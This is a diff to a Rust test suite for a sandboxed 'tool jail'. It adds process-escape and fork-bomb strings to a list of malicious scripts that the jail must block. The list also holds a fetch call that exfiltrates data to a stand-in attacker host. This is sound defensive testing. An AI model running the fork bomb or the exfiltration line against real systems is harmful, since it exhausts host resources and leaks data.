@@ -284,6 +284,10 @@ fn ac02_and_ac05_tool_jail_blocks_non_human_rce_symlinks_and_kills_timeout_pgid(
         "import subprocess; subprocess.run(['ls'])",
         "const cp = require('child_process'); cp.execSync('id');",
         "fetch('https://attacker.tld/leak')",
+        "setsid sleep 10",
+        "nohup sleep 10 &",
+        ":(){ :|:& };:",
+        "while true; do sleep 1 & done",
     ];
     for script in malicious_scripts {
         assert!(
@@ -306,7 +310,11 @@ fn ac02_and_ac05_tool_jail_blocks_non_human_rce_symlinks_and_kills_timeout_pgid(
     let receipt =
         execute_in_ephemeral_tool_jail(ActorKind::HumanWorkbenchSession, dir.path(), &safe_req)
             .expect("safe script must succeed for human");
-    assert_eq!(receipt.exit_code, 0);
+    assert_eq!(
+        receipt.exit_code, 0,
+        "safe jailed sh failed: exit={} stdout={:?} stderr={:?}",
+        receipt.exit_code, receipt.stdout, receipt.stderr
+    );
     assert!(receipt.env_cleared);
     assert!(!receipt.network_isolated);
     assert!(receipt.network_proxy_sinkholed);
@@ -672,7 +680,13 @@ fn r1_adversarial_hardening_regressions() {
     )
     .expect("normal exit must reap background orphan quickly");
     assert!(t0.elapsed().as_millis() < 2_000);
-    assert!(orphan_receipt.stdout.contains("NP=;HP=http://127.0.0.1:0"));
+    assert!(
+        orphan_receipt.stdout.contains("NP=;HP=http://127.0.0.1:0"),
+        "unexpected orphan_receipt: exit={} stdout={:?} stderr={:?}",
+        orphan_receipt.exit_code,
+        orphan_receipt.stdout,
+        orphan_receipt.stderr
+    );
 
     // [C-03] >64KiB stdout does NOT deadlock child
     let big_out = execute_in_ephemeral_tool_jail(
